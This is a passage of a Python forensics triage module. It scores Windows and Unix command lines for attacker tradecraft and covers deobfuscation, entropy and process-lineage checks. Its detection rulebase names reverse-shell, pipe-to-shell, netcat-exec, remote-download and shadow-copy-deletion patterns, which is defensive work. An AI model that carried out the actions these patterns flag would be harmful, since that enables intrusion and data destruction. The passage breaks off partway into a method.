#!/usr/bin/env python3
"""
SUTRA-Trace · Sector B: Multi-Modal Forensic Neural Triage & Telemetry Ingestion
================================================================================

Second layer of the SUTRA-Trace digital forensics framework (SUTRAM 2026, PS-01).
It reads evidence that Sector A has already vaulted, ranks suspicious artifacts
in seconds, and hands every lead to Sectors C and D with a deterministic
Symbolic Cryptographic Anchor:

    P_sym = < Source_Type, Artifact_ID, Byte_Offset, Length, SHA-256(chunk) >

Neuro-symbolic admissibility doctrine
    Scores produced here are triage priorities, never proof. A lead is proven
    by its anchor: the exact byte range of the vaulted evidence it came from,
    which anyone can re-hash (verify_anchor) without trusting this module.
    When the artifacts are extents of a Sector A image, anchor offsets are
    absolute offsets in that image, so Sector C/D can back-bind a lead to the
    physical bytes covered by Sector A's Merkle tree.

Sub-engines
    LogTriageEngine            LOLBins rulebase, Base64 / UTF-16LE / string-
                               concatenation deobfuscation, Shannon entropy,
                               parent-child lineage matrix, MITRE ATT&CK mapping,
                               14-point Section 45 BSA exculpatory checklist.
    DeepfakeTriageEngine       rPPG carotid-to-supraorbital pulse transit phase,
                               dicrotic-notch harmonic ratio, G/R chrominance
                               ratio, 2D-DCT spectral decay with QP-gated
                               compensation, WhatsApp WebRTC ICE extraction with
                               Section 94 BNSS CGNAT/IPDR requisitions, virtual
                               camera registry detection, AnyDesk trace parsing.
    FinancialMuleDetector      NPCI RRN validation, rapid UPI fan-out smurfing,
                               UPI-to-USDT bridge affinity, mirror-hawala note
                               serial tokens, Section 106 BNSS / 1930 freeze
                               notices, FIU-IND STR summary XML.
    AndroidTrojanTriageEngine  dumpsys package / packages.xml / secure settings /
                               usagestats / bugreport ingestion, dangerous
                               capability scoring, foreground overlay timing,
                               polyglot APK and hidden DEX trailer detection.
    SutraNeuralTriageOrchestrator
                               Runs the engines over registered artifacts,
                               anchors every lead and writes triage_manifest.json.

Revision 2 (after the 2026-10-20 adversarial audit, 22 findings, each with a regression check):
    anchors are per record (one <package> element, one CSV row per smurfing leg, both overlay
    events); the Section 45 screen looks 24 h after the command for anti-forensics, reads PascalCase
    Sysmon keys, strips DOMAIN/HOST account prefixes and rebuilds the process tree; rPPG and DCT reject bad
    input instead of raising and flag reversed transit and phase jumps; codec roll-off cannot inflate
    the spectral ratios; IPv6/zone-scoped ICE candidates, RRN rollovers, pooled split inflows, clock
    skew and naive IST times are handled; hawala tokens glued to invoices/filenames are ignored;
    system auth prompts are not overlay leads; APKs and anchors are read in bounded chunks; text
    offsets stay exact with emoji and invalid bytes; malformed artifacts are listed in
    artifact_errors instead of aborting the run.

Revision 3 (after the 2026-10-21 overnight audit; regression group "overnight audit"):
    out-of-range dates (year 1 / 9999), NaN/Infinity/lone surrogates in JSONL, non-string event
    fields, missing or truncated evidence files and bad extents are recorded as artifact errors
    instead of aborting the run; corrupt JSONL lines are reported; BOM-marked UTF-8 and UTF-16LE
    exports parse; '+0530' offsets parse on Python 3.10; naive-IST RRNs are not called invalid;
    the Sector A manifest digest and the bound image's SHA-256 are verified; msgstore.db URIs are
    percent-encoded; memory stays bounded for emoji-heavy text, gzip bombs, zero-width PGMs and
    large logs; the PGM header and packages.xml extents are parsed without backtracking regexes;
    concatenated and >4 MB-prefixed APK polyglots are found; smurfing/bridge matching is
    time-indexed; anchors, the s.45 checklist and STUN entries use absolute offsets; the STR XML
    is checked for well-formedness and cites Rule 8; B's freeze notice is a preliminary view that
    defers to Sector D; verify_anchor and validate_manifest never raise.

Dependencies: Python 3.10+ standard library only. numpy is used for the DFT/DCT
when present; an ONNX model can be attached as an extra pre-filter when
onnxruntime is present. Neither is needed, and neither can change a symbolic
verdict.

Statutes referenced: Sections 39, 45 and 63 Bharatiya Sakshya Adhiniyam, 2023;
Sections 94, 105 and 106 Bharatiya Nagarik Suraksha Sanhita, 2023; PMLA 2002;
ISO/IEC 27037:2012; I4C CFCFRMS (1930).

Run `python sector_b_triage.py [workdir]` for the built-in self-test.
"""

from __future__ import annotations

import array
import base64
import binascii
import bisect
import cmath
import codecs
import csv
import datetime
import functools
import gzip
import hashlib
import importlib.util
import io
import ipaddress
import json
import math
import os
import random
import re
import sqlite3
import struct
import sys
import time
import tracemalloc
import urllib.parse
import zipfile
import xml.etree.ElementTree as ET
import xml.parsers.expat
from zlib import error as zlib_error
from collections import defaultdict
from typing import Any, Dict, Iterable, Iterator, List, Optional, Sequence, Tuple

try:  # Optional accelerator for the DFT / DCT; never required.
    if os.environ.get("SUTRA_NO_NUMPY"):
        raise ImportError
    import numpy as _np  # type: ignore
except Exception:  # pragma: no cover - depends on host
    _np = None

try:  # Optional neural pre-filter runtime; never required.
    import onnxruntime as _ort  # type: ignore
except Exception:  # pragma: no cover - depends on host
    _ort = None


def _load_sector_a():
    """Import prototype/sector_a_vault.py from this folder (not an older copy elsewhere on sys.path)."""
    here = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(here, "sector_a_vault.py")
    mod = sys.modules.get("sector_a_vault")
    if mod is not None and os.path.abspath(getattr(mod, "__file__", "")) == path:
        return mod
    if not os.path.isfile(path):
        return None
    try:
        name = "sector_a_vault" if mod is None else "_sutra_sector_a_vault"
        spec = importlib.util.spec_from_file_location(name, path)
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)  # type: ignore[union-attr]
        return mod
    except Exception:  # pragma: no cover - Sector A broken or absent
        return None


_sector_a = _load_sector_a()

TRIAGE_VERSION = "SUTRA-TRIAGE-2026.3-SUPREME"
TRIAGE_REVISION = "r3"
MANIFEST_FILENAME = "triage_manifest.json"
LEAD_THRESHOLD = 0.50
SECTOR_A_MANIFEST = getattr(_sector_a, "MANIFEST_FILENAME", "evidence_manifest.json")

ADMISSIBILITY_DOCTRINE = (
    "Threat scores are high-recall triage priorities only and are not offered as proof. "
    "Each lead is evidenced by its symbolic anchor: the byte range of the vaulted artifact it was "
    "derived from and that range's SHA-256, which can be re-computed independently of this software "
    "(Section 63 BSA 2023 certificate; Section 39 BSA 2023 opinions of experts; "
    "Section 45 BSA 2023 grounds of opinion).")


# --------------------------------------------------------------------------- #
# Shared helpers                                                              #
# --------------------------------------------------------------------------- #

def _sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def canonical_json(obj: Any) -> bytes:
    """Sorted keys, compact separators, NaN/Infinity rejected: identical bytes on every platform."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False,
                      allow_nan=False).encode("utf-8")


def _r(x: Any, nd: int = 4) -> Optional[float]:
    """
    Round for the manifest so tiny float differences (numpy vs pure Python) never change the bytes.
    NaN/Infinity (e.g. from an ONNX model or a corrupt trace) become None, so canonical_json never fails.
    """
    try:
        x = float(x)
    except (TypeError, ValueError):
        return None
    return float(round(x, nd)) if math.isfinite(x) else None


def _finite(x: Any) -> bool:
    try:
        return math.isfinite(float(x))
    except (TypeError, ValueError):
        return False


def _clean(s: str) -> str:
    """Replace lone surrogates (undecodable bytes kept for offset accuracy) before text reaches the manifest."""
    return s.encode("utf-8", "replace").decode("utf-8")


def _json_clean(v: Any) -> Any:
    """_clean every string (keys too) of a parsed JSON value, e.g. '\\ud800' escapes from UTF-16 command lines."""
    if isinstance(v, str):
        return _clean(v)
    if isinstance(v, dict):
        return {_clean(k) if isinstance(k, str) else k: _json_clean(x) for k, x in v.items()}
    if isinstance(v, list):
        return [_json_clean(x) for x in v]
    return v


def _json_reject_constant(name: str) -> Any:
    raise ValueError(f"non-finite JSON number {name}")


def _json_finite_float(s: str) -> float:
    x = float(s)
    if not math.isfinite(x):
        raise ValueError(f"non-finite JSON number {s[:24]}")
    return x


def noisy_or(weights: Iterable[float]) -> float:
    """Combine independent indicator weights: 1 - prod(1 - w)."""
    p = 1.0
    for w in weights:
        p *= (1.0 - max(0.0, min(1.0, w)))
    return 1.0 - p


def severity_for(score: float) -> str:
    if score >= 0.90:
        return "CRITICAL"
    if score >= 0.75:
        return "HIGH"
    if score >= 0.50:
        return "MEDIUM"
    return "LOW"


def parse_timestamp(value: Any, default_tz: datetime.tzinfo = datetime.timezone.utc) -> float:
    """Epoch seconds from an int/float or ISO-8601 string (naive strings take default_tz)."""
    if isinstance(value, (int, float)):
        return float(value)
    s = str(value).strip()
    if s.endswith(("Z", "z")):
        s = s[:-1] + "+00:00"
    if "T" not in s and " " in s:
        s = s.replace(" ", "T", 1)
    m = re.match(r"^(.*T\d{2}:\d{2}:\d{2})\.(\d+)(.*)$", s)
    if m:  # normalise fractional seconds to 6 digits for Python 3.10
        s = f"{m.group(1)}.{(m.group(2) + '000000')[:6]}{m.group(3)}"
    # ISO-8601 basic offset '+0530' -> '+05:30': Python 3.10's fromisoformat only takes the extended form,
    # 3.11+ takes both, so without this the Linux VM and the Windows box disagree on the same export.
    s = re.sub(r"(T\d{2}:\d{2}(?::\d{2}(?:\.\d+)?)?)([+-]\d{2})(\d{2})$", r"\1\2:\3", s)
    dt = datetime.datetime.fromisoformat(s)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=default_tz)
    return dt.timestamp()


_EPOCH_UTC = datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc)


def _utc_datetime(epoch: float) -> datetime.datetime:
    """
    Aware UTC datetime by pure arithmetic: no gmtime() call, so years before 1970 and after 3000 behave
    the same on Windows (whose gmtime refuses them with OSError) and Linux. Raises ValueError /
    OverflowError for NaN, Infinity and dates outside years 1..9999.
    """
    return _EPOCH_UTC + datetime.timedelta(seconds=epoch)


def iso_utc(epoch: float) -> str:
    """ISO-8601 UTC with milliseconds and a 4-digit zero-padded year (strftime('%Y') does not pad on glibc)."""
    dt = _utc_datetime(epoch)
    return (f"{dt.year:04d}-{dt.month:02d}-{dt.day:02d}T{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d}."
            f"{dt.microsecond // 1000:03d}Z")


def iter_lines(data: bytes) -> Iterator[Tuple[int, int, str]]:
    """
    Yield (byte_offset, byte_length_without_newline, text) for each line, lazily (no list of lines is
    built). UTF-8 by default; a UTF-8 BOM is skipped and a UTF-16LE BOM (Windows PowerShell 5.1 '>'
    redirects, Out-File) switches to UTF-16LE. Offsets are exact byte offsets in data either way.
    Lines are decoded straight from a memoryview, so even one giant line is not copied twice.
    """
    n = len(data)
    with memoryview(data) as mv:
        if data[:2] == b"\xff\xfe":
            end_all = n - ((n - 2) % 2)          # a dangling odd byte is not a code unit
            pos = 2
            while pos < end_all:
                j = data.find(b"\n\x00", pos, end_all)
                while j >= 0 and (j - pos) % 2:    # only a newline on a code-unit boundary
                    j = data.find(b"\n\x00", j + 1, end_all)
                nxt = end_all if j < 0 else j + 2
                stop = end_all if j < 0 else j
                if stop - pos >= 2 and data[stop - 2:stop] == b"\r\x00":
                    stop -= 2
                yield pos, stop - pos, str(mv[pos:stop], "utf-16-le", "replace")
                pos = nxt
            return
        pos = 3 if data[:3] == b"\xef\xbb\xbf" else 0
        j = -2   # cached position of the next LF (-1: none left), so CR-only files stay linear
        while pos < n:
            if j != -1 and j < pos:
                j = data.find(b"\n", pos)
            k = data.find(b"\r", pos, n if j < 0 else j)
            if k >= 0:   # bare CR or CRLF ends the line (same line breaks as bytes.splitlines)
                stop, nxt = k, (k + 2 if k + 1 < n and data[k + 1:k + 2] == b"\n" else k + 1)
            elif j >= 0:
                stop, nxt = j, j + 1
            else:
                stop, nxt = n, n
            yield pos, stop - pos, str(mv[pos:stop], "utf-8", "replace")
            pos = nxt


_OFFSET_BLOCK = 256   # characters per checkpoint in decode_text_with_offsets


def decode_text_with_offsets(data: bytes) -> Tuple[str, Any]:
    """
    Decode UTF-8 or BOM-marked UTF-16LE text; return (text, char_index -> byte_offset).
    Offsets are exact: supplementary characters (emoji) count 4 bytes in UTF-16LE, and each invalid
    UTF-8 byte is kept as one surrogate-escaped character counting exactly 1 byte. Only one 8-byte
    checkpoint per 256 characters is stored (the remainder is re-encoded on demand), so a 25 MB chat
    export with one emoji no longer needs a Python int per character (about 45x the file size).
    """
    if data[:2] == b"\xff\xfe":
        body = data[2:len(data) - (len(data) % 2)]
        text = body.decode("utf-16-le", "surrogatepass")
        base, enc, errs = 2, "utf-16-le", "surrogatepass"
    else:
        text = data.decode("utf-8", "surrogateescape")
        if text.isascii():
            return text, (lambda i: i)
        base, enc, errs = 0, "utf-8", "surrogateescape"
    k = _OFFSET_BLOCK
    marks = array.array("q", [base])
    for j in range(0, len(text), k):
        marks.append(marks[-1] + len(text[j:j + k].encode(enc, errs)))

    def to_byte(i: int) -> int:
        q = i // k
        return marks[q] + len(text[q * k:i].encode(enc, errs))
    return text, to_byte


def shannon_entropy(s: str) -> float:
    """H(S) = -sum p(c) log2 p(c) over the characters of s."""
    if not s:
        return 0.0
    counts: Dict[str, int] = defaultdict(int)
    for ch in s:
        counts[ch] += 1
    n = float(len(s))
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def normalize_ip(token: Optional[str]) -> Optional[str]:
    """Strip IPv6 brackets and %zone suffixes; return the canonical address or None if not an IP."""
    if not token:
        return None
    t = token.strip().strip("[]").split("%", 1)[0]
    try:
        return str(ipaddress.ip_address(t))
    except ValueError:
        return None


def evidence_ref(artifact_id: str, offset: int, length: int, **meta: Any) -> Dict[str, Any]:
    """What an engine returns for a lead: where its proof lives inside a registered artifact."""
    ref = {"artifact_id": artifact_id, "byte_offset": int(offset), "length": int(length)}
    ref.update({k: v for k, v in meta.items() if v is not None})
    return ref


# --------------------------------------------------------------------------- #
# Sub-engine 1: Log & command triage                                          #
# --------------------------------------------------------------------------- #

MITRE_TECHNIQUES = {
    "T1059.001": "PowerShell",
    "T1059.003": "Windows Command Shell",
    "T1059.004": "Unix Shell",
    "T1105": "Ingress Tool Transfer",
    "T1140": "Deobfuscate/Decode Files or Information",
    "T1027": "Obfuscated Files or Information",
    "T1620": "Reflective Code Loading",
    "T1564.003": "Hidden Window",
    "T1218.005": "Mshta",
    "T1218.010": "Regsvr32",
    "T1218.011": "Rundll32",
    "T1197": "BITS Jobs",
    "T1490": "Inhibit System Recovery",
    "T1053": "Scheduled Task/Job",
    "T1053.005": "Scheduled Task",
    "T1204.002": "User Execution: Malicious File",
    "T1204": "User Execution",
    "T1505.003": "Server Software Component: Web Shell",
    "T1219": "Remote Access Software",
}


def mitre_label(tid: Optional[str]) -> Optional[str]:
    return f"{tid} - {MITRE_TECHNIQUES.get(tid, 'Unmapped')}" if tid else None


_URL = r"(?:https?|ftp)://"

# family -> (binary names, [(indicator, regex over lower-cased deobfuscated text, weight, MITRE)])
LOLBIN_RULES: Dict[str, Tuple[Tuple[str, ...], List[Tuple[str, str, float, str]]]] = {
    "powershell": (("powershell", "pwsh"), [
        ("PS_ENCODED_COMMAND", r"(?:^|\s)[-/]e(?:nc(?:odedcommand)?|c|n)?(?=\s)", 0.55, "T1059.001"),
        ("PS_DOWNLOADSTRING", r"downloadstring|downloadfile|downloaddata", 0.60, "T1105"),
        ("PS_NET_WEBCLIENT", r"net\.webclient|invoke-webrequest|\biwr\b|start-bitstransfer", 0.50, "T1105"),
        ("PS_INVOKE_EXPRESSION", r"invoke-expression|\biex\b", 0.45, "T1059.001"),
        ("PS_EXECUTION_POLICY_BYPASS", r"\bbypass\b", 0.30, "T1059.001"),
        ("PS_HIDDEN_WINDOW", r"\bhidden\b|-w(?:indowstyle)?\s+h", 0.30, "T1564.003"),
        ("PS_REFLECTIVE_ASSEMBLY", r"system\.reflection\.assembly|\[reflection\.assembly\]", 0.55, "T1620"),
    ]),
    "certutil": (("certutil",), [
        ("CERTUTIL_URLCACHE", r"[-/]urlcache", 0.75, "T1105"),
        ("CERTUTIL_SPLIT", r"[-/]split\b", 0.30, "T1105"),
        ("CERTUTIL_FORCE", r"(?:^|\s)[-/]f(?=\s|$)", 0.15, "T1105"),
        ("CERTUTIL_DECODE", r"[-/]decode(?:hex)?\b", 0.60, "T1140"),
        ("CERTUTIL_REMOTE_URL", _URL, 0.30, "T1105"),
    ]),
    "mshta": (("mshta",), [
        ("MSHTA_SCRIPT_PROTOCOL", r"javascript:|vbscript:|about:", 0.75, "T1218.005"),
        ("MSHTA_REMOTE_HTA", _URL, 0.70, "T1218.005"),
    ]),
    "bitsadmin": (("bitsadmin",), [
        ("BITSADMIN_TRANSFER", r"/transfer|/download|/addfile", 0.60, "T1197"),
        ("BITSADMIN_FOREGROUND", r"/priority\s+foreground", 0.20, "T1197"),
        ("BITSADMIN_REMOTE_URL", _URL, 0.35, "T1105"),
    ]),
    "shadowcopy": (("vssadmin", "wmic", "wbadmin"), [
        ("SHADOW_COPY_DELETE", r"delete\s+shadows|shadowcopy\s+delete|delete\s+catalog", 0.90, "T1490"),
        ("SHADOW_STORAGE_RESIZE", r"resize\s+shadowstorage", 0.80, "T1490"),
    ]),
    "rundll32": (("rundll32", "regsvr32"), [
        ("SQUIBLYDOO_REMOTE_SCT", r"/i:\s*" + _URL, 0.70, "T1218.010"),
        ("SCROBJ_DLL", r"scrobj\.dll", 0.60, "T1218.010"),
        ("RUNDLL32_SCRIPT_PROTOCOL", r"javascript:", 0.75, "T1218.011"),
        ("RUNDLL32_SHELL32_EXEC", r"shell32\.dll\s*,\s*(?:shellexec_rundll|control_rundll)", 0.30, "T1218.011"),
    ]),
    "schtasks": (("schtasks", "at"), [
        ("SCHTASK_CREATE", r"/create\b.*?/tn\b|/create\b", 0.35, "T1053.005"),
        ("SCHTASK_ONLOGON", r"/sc\s+onlogon|/sc\s+onstart", 0.30, "T1053.005"),
        ("SCHTASK_RUN_AS_SYSTEM", r"/ru\s+\"?system", 0.35, "T1053.005"),
    ]),
    "downloader": (("curl", "wget", "certreq"), [
        ("REMOTE_BINARY_DOWNLOAD", _URL + r"\S+\.(?:exe|dll|ps1|bat|hta|sct|apk|bin|zip|7z)\b", 0.55, "T1105"),
        ("DOWNLOADER_OUTPUT_FILE", r"(?:^|\s)(?:-o|-outfile|--output|-O)\s", 0.25, "T1105"),
        ("CERTREQ_POST", r"certreq(?:\.exe)?\s+-post", 0.55, "T1105"),
    ]),
    "unix_shell": (("bash", "sh", "curl", "wget", "nc", "python", "python3"), [
        ("PIPE_TO_SHELL", r"(?:curl|wget)[^|]*\|\s*(?:ba)?sh\b", 0.75, "T1059.004"),
        ("BASE64_TO_SHELL", r"base64\s+(?:-d|--decode)[^|]*\|\s*(?:ba)?sh\b", 0.70, "T1140"),
        ("NETCAT_EXEC", r"\bnc(?:at)?\b[^\n]*\s-e\s", 0.80, "T1059.004"),
        ("DEV_TCP_REVERSE_SHELL", r"/dev/tcp/\d", 0.80, "T1059.004"),
    ]),
}

_OFFICE = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "msaccess.exe", "mspub.exe", "onenote.exe"}
_SCRIPT_HOSTS = {"cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe",
                 "rundll32.exe", "regsvr32.exe", "certutil.exe", "bitsadmin.exe"}
_BROWSERS = {"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe", "brave.exe", "opera.exe"}
_CLI_TOOLS = _SCRIPT_HOSTS | {"curl.exe", "wget.exe", "certreq.exe", "schtasks.exe", "wmic.exe", "vssadmin.exe",
                              "net.exe", "net1.exe", "whoami.exe", "bash.exe"}
_WEB_SERVERS = {"w3wp.exe", "httpd.exe", "nginx.exe", "tomcat.exe", "tomcat9.exe", "php-cgi.exe"}
_REMOTE_TOOLS = {"anydesk.exe", "teamviewer.exe", "teamviewer_service.exe", "rustdesk.exe", "ultraviewer.exe",
                 "screenconnect.clientservice.exe", "atera_agent.exe", "splashtop.exe", "srserver.exe"}
# Remote-management daemons: a process descending from one of these was started over the network.
_REMOTE_DAEMONS = {"wsmprovhost.exe", "winrshost.exe", "psexesvc.exe", "sshd.exe", "rdpclip.exe",
                   "wmiprvse.exe", "msiexec.exe", "services.exe", "taskeng.exe", "taskhostw.exe"}
_DESKTOP_ROOTS = {"explorer.exe", "userinit.exe"}
_ADMIN_CONSOLES = _SCRIPT_HOSTS | {"mmc.exe", "regedit.exe", "taskmgr.exe", "net.exe", "sc.exe", "wmic.exe",
                                   "vssadmin.exe", "compmgmt.msc"}

# (parent set, child set, indicator, penalty, MITRE)
LINEAGE_MATRIX = [
    (_OFFICE, _SCRIPT_HOSTS, "OFFICE_SPAWNED_SHELL", 0.45, "T1204.002"),
    (_BROWSERS, _CLI_TOOLS, "BROWSER_SPAWNED_CLI", 0.50, "T1204"),
    (_WEB_SERVERS, _CLI_TOOLS, "WEB_SERVER_SPAWNED_SHELL", 0.60, "T1505.003"),
    (_REMOTE_TOOLS, _ADMIN_CONSOLES, "REMOTE_TOOL_SPAWNED_ADMIN_CONSOLE", 0.40, "T1219"),
    ({"wsmprovhost.exe", "winrshost.exe", "psexesvc.exe", "sshd.exe"}, _ADMIN_CONSOLES,
     "REMOTE_MANAGEMENT_SPAWNED_SHELL", 0.40, "T1219"),
]

# Sysmon / Windows Event JSON keys -> the snake_case names used throughout this module
_EVENT_KEY_ALIASES = {
    "Image": "image", "ParentImage": "parent_image", "CommandLine": "command_line", "User": "user",
    "LogonType": "logon_type", "EventID": "event_id", "EventId": "event_id", "UtcTime": "timestamp",
    "TimeCreated": "timestamp", "ProcessId": "process_id", "ParentProcessId": "parent_process_id",
    "ProcessGuid": "process_guid", "ParentProcessGuid": "parent_process_guid", "SourceIp": "source_ip",
    "IpAddress": "source_ip", "TargetUserName": "user", "SubjectUserName": "user", "Computer": "host",
    "NewProcessName": "image", "ParentProcessName": "parent_image", "NewProcessId": "process_id",
}


def normalize_event(ev: Dict[str, Any]) -> Dict[str, Any]:
    """Add snake_case aliases for PascalCase Sysmon/Security keys (originals are kept)."""
    for src, dst in _EVENT_KEY_ALIASES.items():
        if src in ev and ev.get(dst) in (None, ""):
            ev[dst] = ev[src]
    return ev


def _account_name(user: Any) -> str:
    """'VICTIM-PC\\rahul', 'DOMAIN\\rahul' and 'rahul@corp.in' all reduce to 'rahul'."""
    s = str(user or "").strip().lower()
    s = s.rsplit("\\", 1)[-1]
    return s.split("@", 1)[0]

_ENC_ARG = re.compile(r"(?:^|\s)[-/]e(?:nc(?:odedcommand)?|c|n)?\s+['\"]?([A-Za-z0-9+/]{8,}={0,2})", re.I)
_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{40,}={0,2}(?![A-Za-z0-9+/=])")


def _basename(path: Optional[str]) -> str:
    if not path or not isinstance(path, str):   # a numeric/list/object Image field is not a path
        return ""
    return re.split(r"[\\/]", path.strip().strip('"'))[-1].lower()


def _image_from_cmdline(cmd: str) -> str:
    cmd = cmd.strip()
    if cmd.startswith('"'):
        end = cmd.find('"', 1)
        return _basename(cmd[1:end] if end > 0 else cmd[1:])
    return _basename(cmd.split()[0]) if cmd else ""


class LogTriageEngine:
    """LOLBins, deobfuscation, entropy, lineage and the Section 45 BSA exculpatory checklist."""

    ENTROPY_THRESHOLD = 4.8
    ENTROPY_MIN_LENGTH = 40
    MAX_DECODE_DEPTH = 3

    # ----- deobfuscation --------------------------------------------------- #

    @staticmethod
    def flatten_strings(text: str) -> str:
        """Resolve 'down'+'load' style concatenation, PowerShell backtick and cmd caret escapes."""
        out = re.sub(r"(['\"])\s*\+\s*(['\"])", "", text)
        out = out.replace("`", "")
        out = re.sub(r"\^(?=[A-Za-z0-9])", "", out)
        return out

    @staticmethod
    def decode_base64_payload(token: str) -> Optional[Tuple[str, str]]:
        """Return (text, encoding) if token is Base64 of printable UTF-16LE or UTF-8 text."""
        tok = token.strip("'\"")
        tok += "=" * (-len(tok) % 4)
        try:
            raw = base64.b64decode(tok, validate=True)
        except (binascii.Error, ValueError):
            return None
        if len(raw) < 4:
            return None
        odd_zero = sum(1 for b in raw[1::2] if b == 0) / max(1, len(raw[1::2]))
        candidates = [("utf-16-le", raw)] if odd_zero > 0.6 else []
        candidates.append(("utf-8", raw))
        for enc, blob in candidates:
            try:
                text = blob.decode(enc)
            except UnicodeDecodeError:
                continue
            printable = sum(1 for c in text if c.isprintable() or c in "\r\n\t") / max(1, len(text))
            if printable >= 0.95:
                return text, enc
        return None

    def deobfuscate(self, command_line: str) -> List[Dict[str, str]]:
        """Layers: raw, flattened, then every Base64 payload found (recursively, bounded depth)."""
        layers = [{"stage": "raw", "encoding": "as-logged", "text": command_line}]
        flat = self.flatten_strings(command_line)
        if flat != command_line:
            layers.append({"stage": "flattened", "encoding": "string-concatenation", "text": flat})
        frontier, seen = [flat], {command_line, flat}
        for depth in range(1, self.MAX_DECODE_DEPTH + 1):
            nxt = []
            for text in frontier:
                tokens = [m.group(1) for m in _ENC_ARG.finditer(text)] + _B64_TOKEN.findall(text)
                for tok in tokens:
                    dec = self.decode_base64_payload(tok)
                    if not dec:
                        continue
                    decoded = self.flatten_strings(dec[0])
                    if decoded in seen:
                        continue
                    seen.add(decoded)
                    layers.append({"stage": f"base64_depth_{depth}", "encoding": dec[1], "text": decoded})
                    nxt.append(decoded)
            frontier = nxt
            if not frontier:
                break
        return layers

    def high_entropy_tokens(self, text: str) -> List[Dict[str, Any]]:
        hits = []
        for tok in re.split(r"[\s'\"(),;|]+", text):
            if len(tok) > self.ENTROPY_MIN_LENGTH:
                h = shannon_entropy(tok)
                if h >= self.ENTROPY_THRESHOLD:
                    hits.append({"token_prefix": tok[:24], "length": len(tok), "entropy": _r(h)})
        return hits

    # ----- scoring --------------------------------------------------------- #

    @staticmethod
    def lineage_indicators(parent_image: Optional[str], image: str) -> List[Dict[str, Any]]:
        parent, child = _basename(parent_image), _basename(image)
        out = []
        for parents, children, name, penalty, tid in LINEAGE_MATRIX:
            if parent in parents and child in children:
                out.append({"indicator": name, "weight": penalty, "mitre": tid,
                            "detail": f"{parent} -> {child}"})
        return out

    def analyze_command(self, command_line: str, image: Optional[str] = None,
                        parent_image: Optional[str] = None) -> Dict[str, Any]:
        image_name = _basename(image) or _image_from_cmdline(command_line)
        layers = self.deobfuscate(command_line)
        corpus = "\n".join(l["text"] for l in layers).lower()
        indicators: List[Dict[str, Any]] = []
        for family, (aliases, rules) in LOLBIN_RULES.items():
            alias_rx = r"(?<![\w.-])(?:" + "|".join(map(re.escape, aliases)) + r")(?:\.exe)?(?![\w-])"
            if not (re.search(alias_rx, corpus) or image_name.split(".")[0] in aliases):
                continue
            for name, rx, weight, tid in rules:
                if re.search(rx, corpus, re.M):
                    indicators.append({"indicator": name, "family": family, "weight": weight, "mitre": tid})
        decoded = [l for l in layers if l["stage"].startswith("base64")]
        if decoded:
            indicators.append({"indicator": "OBFUSCATED_PAYLOAD_DECODED", "family": "obfuscation",
                               "weight": 0.30, "mitre": "T1140"})
        if any(l["stage"] == "flattened" for l in layers):
            indicators.append({"indicator": "STRING_CONCATENATION_OBFUSCATION", "family": "obfuscation",
                               "weight": 0.20, "mitre": "T1027"})
        entropy_hits = self.high_entropy_tokens(command_line)
        if entropy_hits:
            indicators.append({"indicator": "SUSPICIOUS_HIGH_ENTROPY_PACKING", "family": "entropy",
                               "weight": 0.35, "mitre": "T1027"})
        lineage = self.lineage_indicators(parent_image, image_name)
        base_score = noisy_or(i["weight"] for i in indicators)
        score = noisy_or([base_score] + [l["weight"] for l in lineage])
        all_ind = indicators + [dict(l, family="lineage") for l in lineage]
        primary = max(all_ind, key=lambda i: (i["weight"], i["mitre"])) if all_ind else None
        return {
            "image": image_name,
            "parent_image": _basename(parent_image) or None,
            "threat_score": _r(score),
            "content_score": _r(base_score),
            "parent_child_penalty": _r(score - base_score),
            "severity": severity_for(score),
            "indicators": all_ind,
            "mitre_techniques": sorted({i["mitre"] for i in all_ind}),
            "primary_mitre": mitre_label(primary["mitre"]) if primary else None,
            "deobfuscation_layers": [{"stage": l["stage"], "encoding": l["encoding"], "text": l["text"][:512]}
                                     for l in layers],
            "high_entropy_tokens": entropy_hits,
        }

    # ----- event ingestion ------------------------------------------------- #

    @staticmethod
    def parse_events_jsonl(data: bytes, errors: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """
        One JSON event per line (Sysmon 1 / Security 4688 / auditd exports); keeps each line's byte range.
        JSONL is strict, so a line that is not one JSON object (corruption, NaN/Infinity/1e999, nesting
        too deep) is skipped and reported in errors. Lone-surrogate escapes are replaced.
        """
        events = []
        for off, length, text in iter_lines(data):
            if not text.strip():
                continue
            try:
                ev = json.loads(text, parse_constant=_json_reject_constant, parse_float=_json_finite_float)
                if "\\u" in text:   # only an escape can produce a lone surrogate (iter_lines decodes with 'replace')
                    ev = _json_clean(ev)
            except (ValueError, RecursionError) as exc:   # JSONDecodeError is a ValueError
                if errors is not None:
                    errors.append(f"unparseable JSONL line at byte {off}: {type(exc).__name__}")
                continue
            if not isinstance(ev, dict):
                if errors is not None:
                    errors.append(f"non-object JSON at byte {off}")
                continue
            # every event is kept for the Section 45 screen: share the key strings across events
            # (about a third of an event's memory in a large Sysmon export)
            ev = {sys.intern(k): v for k, v in ev.items()}
            normalize_event(ev)
            ev["_offset"], ev["_length"] = off, length
            events.append(ev)
        return events

    def triage_events(self, events: Sequence[Dict[str, Any]], artifact_id: str = "",
                      threshold: float = LEAD_THRESHOLD, errors: Optional[List[str]] = None
                      ) -> List[Dict[str, Any]]:
        """Score every command-line event; one malformed record is reported in errors and skipped, not fatal."""
        leads = []
        for ev in events:
            try:
                lead = self._triage_event(ev, artifact_id, threshold)
            except Exception as exc:  # e.g. a field of an unexpected type: drop the record, keep the others
                if errors is not None:
                    errors.append(f"event at byte {ev.get('_offset', '?') if isinstance(ev, dict) else '?'} "
                                  f"not triaged: {type(exc).__name__}: {exc}"[:300])
                continue
            if lead is not None:
                leads.append(lead)
        return leads

    def _triage_event(self, ev: Dict[str, Any], artifact_id: str, threshold: float) -> Optional[Dict[str, Any]]:
